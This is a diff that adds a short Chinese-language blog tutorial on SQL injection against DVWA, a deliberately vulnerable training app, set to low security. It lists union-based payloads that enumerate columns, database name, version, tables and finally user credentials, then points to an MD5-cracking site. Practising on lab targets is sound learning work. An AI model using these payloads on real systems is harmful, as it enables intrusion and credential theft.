@@ -86,7 +86,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <p>1.登录DVWA，设置安全等级为LOW<br>2.输入1’order by 2#,有数据内容出现，输入1’order by 3#,没有数据内容显示，说明数据列只有2列<br>3.输入1’union select database(),user()#,查询数据库的名字，用户名<br>4.输入1’union select version(),@@version_compile_os#’,获取数据库版本和当前操作系统<br>5.输入1’union select table_name,table_schema from information_schema.tables where table_schema= ’dvwa’#,获取数据表的名称，注意’dvwa’前面有空格<br>6.输入1’union select user,password from users#,尝试获得用户名和密码<br>7.密码采用md5进行加密，到<a target="_blank" rel="noopener" href="http://www.cmd5.com进行解密/">www.cmd5.com进行解密</a></p>
+
       
     </div>
     <footer class="article-footer">
